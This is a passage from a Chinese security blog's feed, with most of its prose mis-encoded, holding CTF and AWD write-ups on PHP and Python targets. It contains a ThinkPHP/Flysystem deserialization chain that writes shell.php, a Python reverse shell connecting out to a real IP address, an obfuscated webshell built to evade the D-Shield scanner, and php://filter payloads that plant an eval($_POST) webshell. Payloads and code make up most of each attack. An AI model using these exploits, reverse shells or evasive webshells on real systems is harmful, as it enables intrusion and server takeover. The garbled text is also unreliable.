<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>&#123;</span><br><span class="line">    <span class="title">interface</span> <span class="title">CacheInterface</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $autosave = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $complete=<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>; <span class="comment">//æ³¨æ„è¿™é‡Œæœ‰jsonencode,ä½†æ˜¯ä¸å½±å“</span></span><br><span class="line">        <span class="keyword">protected</span> $adapter;</span><br><span class="line">        <span class="keyword">protected</span> $file = <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adapter = $a;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">        protected $pathPrefix =&#x27;&#x27;;</span><br><span class="line">        <span class="keyword">protected</span> $writeFlags =<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">Local</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line">    $loc = <span class="keyword">new</span> Local();</span><br><span class="line">    $ada = <span class="keyword">new</span> Adapter($loc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($ada));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å•Šæ„Ÿè§‰è¿˜æ˜¯å­¦åˆ°äº†æ–°å§¿åŠ¿ï¼Œé¦–å…ˆå¯ä»¥é€šè¿‡æ‰¾å­—ç±»å®ç°äº†æ¥å£ï¼Œæ‰€ä»¥ä¸è¦çœ‹åˆ°æœ‰çš„æŠ½è±¡ç±»çš„saveæ— æ³•ä½¿ç”¨å°±æ”¾å¼ƒäº†ï¼Œå…¶å®ä¹Ÿå¯ä»¥çš„ã€‚</p>
<p>å…¥å£åœ¨AbstractCacheçš„destructä¸‹é¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line"><span class="comment">//        var_dump($this-&gt;autosave);</span></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘ç°saveæ²¡æ³•è¿‡å»ï¼Œæ•…æ‰¾ä¸€ä¸ªå­—ç±»ç»§æ‰¿äº†çˆ¶ç±»çš„ï¼Œæ‰¾åˆ°</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200009828.png" alt="image-20210506200009828"></p>
<p>çœ‹åˆ°save</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200032209.png" alt="image-20210506200032209"></p>
<p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯writeï¼Œæ‰€ä»¥å…¨å±€æœç´¢writeï¼Œæ‰¾åˆ°å­ç±»Local</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200225344.png" alt="image-20210506200225344"></p>
<p>é‡ç‚¹å°±æ˜¯è¿™ä¸ªfile_put_contents,ç„¶åæˆ‘ä»¬å‘ç°è¿™ä¸‰ä¸ªå‚æ•°éƒ½å¯ä»¥æ§åˆ¶= =ï¼Œä½†æ˜¯é¢ä¸´ä¸€ä¸ªé—®é¢˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;adapter-&gt;has(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;adapter-&gt;update(<span class="keyword">$this</span>-&gt;file, $contents, $config);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºä¼šæœ‰$this-&gt;fileï¼Œå¦‚æœæˆ‘ä»¬èµ‹å€¼çš„è¯å°±ä¸ä¼šè¿›å…¥äº†ï¼Œç„¶è€Œç„¶è€Œï¼Œæˆ‘åˆåœ¨å½“å‰ç±»æ‰¾äº†æ‰¾updateæ–¹æ³•ï¼Œå‡ºä¹æ„æ–™çš„</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200400314.png" alt="image-20210506200400314"></p>
<p>æ¬¸ï¼Œä¹Ÿèƒ½å†™å…¥ï¼Œæ‰€ä»¥ç›´æ¥å†™è¿›å°±å¥½äº†ï¼Œæ„é€ expå‡ºæ¥å°±æœ‰äº†ã€‚</p>
<p>ç»“æœï¼š</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200513501.png" alt="image-20210506200513501"></p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>vnctf</title>
    <url>/2021/03/23/vnctf/</url>
    <content><![CDATA[<p>VNCTF çš„åˆ·é¢˜è®°å½•</p>
<h1 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h1><p>ä¸€ä¸ªCVEçš„å¤åŸCVE-2020-7245ï¼Œæ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„</p>
<h1 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h1><p>è¿™ä¸ªé¢˜ç›®ç®—æ¯”è¾ƒç®€å•å˜ï¼Œ</p>
<p>é¢˜ç›®ç»™å‡ºæºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹è§shellçš„partå»æ‰§è¡Œå‘½ä»¤äº†ã€‚ç›´æ¥åå¼¹shell</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">shell?c=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;81.69.201.65&#x27;,8002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªtrickï¼Œå°±æ˜¯å½“Pythonå¤„ç†æ–‡ä»¶çš„æ—¶å€™ï¼Œè‹¥ä»…ä»…æ˜¯openå´æ²¡æœ‰closeæµçš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥é€šè¿‡procä¸‹è¯»å–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;*</span><br></pre></td></tr></table></figure>

<p>å³å¯ã€‚</p>
<h1 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h1><p>å­¦åˆ°äº†..æ·±æ„Ÿè‡ªå·±å¯¹äºHTTPå’ŒNCçš„äº†è§£ä¸è¶³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹çœ‹è§æœ‰ä¸ªä»»æ„æ–‡ä»¶è¯»å–æˆ‘å°±åœ¨é‚£çŒ›è¯»ï¼Œç»“æœå•¥ä¹Ÿæ²¡æœ‰ï¼Œåæ¥æ‰çŸ¥é“æ˜¯GuzzleHttpçš„æ¼æ´ï¼Œæ–‡ç« å‡ºå¤„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.laruence.com&#x2F;2016&#x2F;07&#x2F;19&#x2F;3101.html</span><br></pre></td></tr></table></figure>

<p>åœ¨æ–‡ç« å½“ä¸­æˆ‘ä»¬å°±å¯ä»¥çœ‹è§ä½œè€…è¯´åˆ°ï¼š</p>
<p>æ‰€ä»¥ï¼Œ è¿™ä¸ªæ¼æ´è¦å½±å“ä½ ï¼Œ æœ‰å‡ ä¸ªæ ¸å¿ƒå‰ææ˜¯:</p>
<ul>
<li>ä½ çš„æœåŠ¡ä¼šå¯¹å¤–è¯·æ±‚èµ„æº</li>
<li>ä½ çš„æœåŠ¡ä½¿ç”¨äº†HTTP_PROXY(å¤§å†™çš„)ç¯å¢ƒå˜é‡æ¥ä»£ç†ä½ çš„è¯·æ±‚ï¼ˆå¯èƒ½æ˜¯ä½ è‡ªå·±å†™ï¼Œæˆ–æ˜¯ä½¿ç”¨ä¸€äº›æœ‰ç¼ºé™·çš„ç±»åº“ï¼‰</li>
<li>ä½ çš„æœåŠ¡è·‘åœ¨PHPçš„CGIæ¨¡å¼ä¸‹(cgi, php-fpm)</li>
</ul>
<p>é‚£ä¹ˆå…ˆçœ‹phpinfoï¼Œç¡®å®è¿è¡Œæ‰CGIæ¨¡å¼ä¸‹ï¼Œä¹‹åå†çœ‹ç¯å¢ƒä»£ç†ï¼Œä½œè€…æ¸…æ¥šçš„å†™å‡ºäº†http_proxyçš„Guzzleæœ‰ç¼ºé™·ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–‡ç« ä¸­ä½œè€…ç»™å‡ºçš„å§¿åŠ¿ï¼š</p>
<p><img src="image-20210323201359448.png" alt="image-20210323201359448"></p>
<p>æˆ‘ä»¬åˆ©ç”¨ncå°±å¯ä»¥æ“ä½œåˆ°ï¼Œå…ˆç›‘å¬ï¼Œä¹‹åä¼ªé€ ä¸€ä¸ªè®¿é—®çš„ä¿¡æ¯å³å¯</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span>: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: Keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="image-20210323201426824.png" alt="image-20210323201426824"></p>
]]></content>
  </entry>
  <entry>
    <title>ä¸€äº›è¿‡ç‹—é©¬</title>
    <url>/2020/12/14/%E4%B8%80%E4%BA%9B%E8%BF%87%E7%8B%97%E9%A9%AC/</url>
    <content><![CDATA[<p>å†™è¿™ç¯‡çš„åŸå› ä¸»è¦æ˜¯ä¸€æ¬¡å¯¹å†…çš„AWDè‡ªå·±è¢«ä¸€ä¸ªè¿‡ç‹—é©¬çš„æ–¹å¼å¡ä½äº†ï¼Œæƒ³äº†åŠå¤©æ‰æŠ˜è…¾å‡ºæ¥ï¼Œæ‰€ä»¥æ‰“ç®—æ€»ç»“ä¸€ä¸‹å„ç§è¿‡ç‹—é©¬çš„å§¿åŠ¿ã€‚</p>
<p>åœ¨å„ç¯‡AWDæ¯”èµ›ä¸­æ€»ä¼šæ•™æˆ‘ä»¬èµ·æ‰‹å¼å°±æ˜¯æŠŠåŸä»¶è„±ä¸‹æ¥å¤‡ä»½ï¼Œä¹‹åå°±æ˜¯ç”¨Dç›¾æ‰«ã€‚è€ŒDç›¾è¿™ä¸ªä¸œè¥¿å¯¹äºä»£ç çš„è¯†åˆ«å¾ˆå¤šæ—¶å€™ä¹Ÿå°±æ˜¯å±€é™äºå¯¹ä¸€äº›å‡½æ•°çš„æ­£åˆ™åŒ¹é…ã€‚æ‰€ä»¥æˆ‘ä»¬ç»•è¿‡éœ€è¦æ³¨æ„å‡ ç‚¹å³å¯ï¼š</p>
<ul>
<li>å¯¹äºevalï¼Œcall_backå‡½æ•°æ˜¯ä¸èƒ½ç”¨çš„</li>
<li>å°è¯•ä½¿ç”¨ä¸€äº›ç½•è§çš„call backå‡½æ•°</li>
</ul>
<p>è®°å½•ä¸€ä¸ªå‚»é€¼ç©æ„å„¿ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~åŒº[$__].~å†ˆ[$__].~åŒº[$__].~å‹º[$__].~çš®[$__].~é’ˆ[$__];$____=~ç [$__].~å¯¸[$__].~å°[$__].~æ¬ [$__].~ç«‹[$__];$___($$____[_]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç æ˜¯_</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>å…¨å›½å·¥æ§2020-web-easyphp</title>
    <url>/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/</url>
    <content><![CDATA[<h1 id="å…¨å›½å·¥æ§2020-web-easyphp"><a href="#å…¨å›½å·¥æ§2020-web-easyphp" class="headerlink" title="å…¨å›½å·¥æ§2020-web-easyphp"></a>å…¨å›½å·¥æ§2020-web-easyphp</h1><h2 id="1-ä»ä¼ªåè®®å¼€å§‹è¯´èµ·"><a href="#1-ä»ä¼ªåè®®å¼€å§‹è¯´èµ·" class="headerlink" title="1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·"></a>1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·</h2><p>php://filteræ˜¯PHPä¸­ç‹¬æœ‰çš„åè®®ï¼Œè¯¥åè®®æµå…è®¸æˆ‘ä»¬ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œ</p>
<p>åœ¨ä¹‹å‰ä¸‰ä¸ªç™½å¸½ä¸­æœ‰ä¸€ä¸ªæ¯”èµ›ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>

<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h3><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œå¦‚æœæ­£å¸¸çš„ç¼–è¯‘ä»£ç ï¼Œç”±äºåœ¨å¼€å¤´åŠ å…¥äº†exitå†…å®¹ï¼Œå³ä½¿æˆ‘ä»¬å†™å…¥äº†ä¸€å¥è¯ä¹Ÿæ— æ³•è§£æã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡filenameåœ¨phpå†™å…¥çš„æ—¶å€™æ„é€ åè®®ï¼Œæ‰€ä»¥åˆ©ç”¨base64-decodeæ–¹æ³•è§£ç æ„é€ ä¸€å¥è¯çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¼šå‘ç°å¦‚æœç›´æ¥æ‰“å…¥è¿›å»ï¼Œbase64è§£ææ²¡æœ‰æˆåŠŸï¼Œè¿™å°±æ˜¯å› ä¸ºbaseæ˜¯ç”±4å­—èŠ‚ç»„æˆä¸€æ¬¡payloadã€‚æ‰€ä»¥è¯è¯´å›å»ï¼Œ</p>
<p>å½“æˆ‘ä»¬ä½¿ç”¨base64decodeåè®®çš„æ—¶å€™ï¼Œ&lt; ? ; ?&gt;ç­‰ç­‰éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥æºä»£ç åˆ™ä¼šè¢«è¯†åˆ«ä¸ºï¼š</p>
<p>phpexitï¼Œè€Œbase64æ˜¯å››ä¸ªå­—èŠ‚è¿˜åŸæˆä¸€ä¸ªå­—æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦å†å ä¸€ä¸ªä½æ•°ï¼Œç»™å¥¹ï¼Œä¹Ÿå°±æ˜¯phpexit[?]æ„é€ æˆå…«ä¸ªå­—èŠ‚ä¾›basedecodeä½¿ç”¨ï¼Œä¹‹ååœ¨åé¢å†ç¼–ä¸Šæˆ‘ä»¬è‡ªå·±çš„payloadï¼Œæ‰€ä»¥è¿™é“é¢˜å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œä»éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ„é€ çš„æ—¶å€™payloadå½“ä¸­ä¸å…è®¸å‡ºç°+å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦åˆ™ä¼šé‡è§æ²¡æœ‰è¢«å†™ä¸Šå»æƒ…å†µã€‚ï¼Œå®é™…ä¸Šï¼Œé™¤äº†baseè¿‡æ»¤å™¨ï¼Œè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤å™¨å¯ä»¥ä¾›ç»™æˆ‘ä»¬ä½¿ç”¨ï¼š</p>
<p>å®˜ç½‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php è¿‡æ»¤å™¨</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php è½¬æ¢è¿‡æ»¤å™¨</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php å­—ç¬¦è¿‡æ»¤å™¨</span><br></pre></td></tr></table></figure>

<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2.rot13"></a>2.rot13</h3><p>é™¤æ­¤ä¹‹å¤–æˆ‘å°è¯•ä½¿ç”¨rot13æ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¼šå‘ç°rot13ä¹‹åçš„ç»“æœä¸åˆæ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php&amp;txt=<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°phpä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc rkvg; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªåˆ†å·ï¼Œè€Œå¯¼è‡´å¤±è´¥äº†ï¼ˆå¼€å¯çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œåªè¦ç”¨&lt;? ?&gt;ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æï¼‰ä½†å¦‚æœå…³é—­çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">txt=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>&amp;filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸï¼é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¡¥å……ä¸€ç§éªšæ€è·¯ï¼š</p>
<h3 id="3-iconvå­—ç¬¦ç¼–ç è½¬æ¢"><a href="#3-iconvå­—ç¬¦ç¼–ç è½¬æ¢" class="headerlink" title="3.iconvå­—ç¬¦ç¼–ç è½¬æ¢"></a>3.iconvå­—ç¬¦ç¼–ç è½¬æ¢</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>iconvå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå½“å‰ç¼–ç ï¼Œè½¬æ¢åç¼–ç ï¼Œä¹‹åå†è½¬å›å»ï¼Œæ‰€ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åå…¶é“è¡Œä¹‹ã€‚ä½†æ˜¯åœ¨è¿™é‡Œï¼Œåˆ©ç”¨è¯¥å­—ç¬¦ç¼–ç ï¼Œä¼šå¯¼è‡´å‡ºç°ä¹‹å‰çš„+å·çš„é—®é¢˜ï¼Œäºæ˜¯å°±å¤±è´¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¤§ä½¬ç»™å‡ºçš„UCS2-2 ç¼–ç çš„æ–¹å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUCS2çš„ç¼–ç æ–¹å¼æ˜¯2ä½ä¸€æ¬¡è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä¿è¯éœ€è¦è½¬æ¢çš„ç¼–ç ä¸º2ä½æ•°ï¼Œä¸å¤Ÿçš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºæ ¼å ä½,è€Œæˆ‘ä»¬ä¸Šé¢çš„è½¬æ¢ä¹‹åç›´æ¥ç”¨çš„è¯ï¼Œä¼šå‘ç°æ— æ³•è½¬æ¢ï¼Œè¿™æ˜¯å› ä¸ºå¿…é¡»ä¿è¯&lt;?php exit();ä¹Ÿè¢«æˆåŠŸè½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å‰é¢å†åŠ ä¸Šä¸€ä¸ª1å³å¯ï¼Œ</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>å†™å…¥shellï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>4.ç»„åˆä½¿ç”¨ï¼š</p>
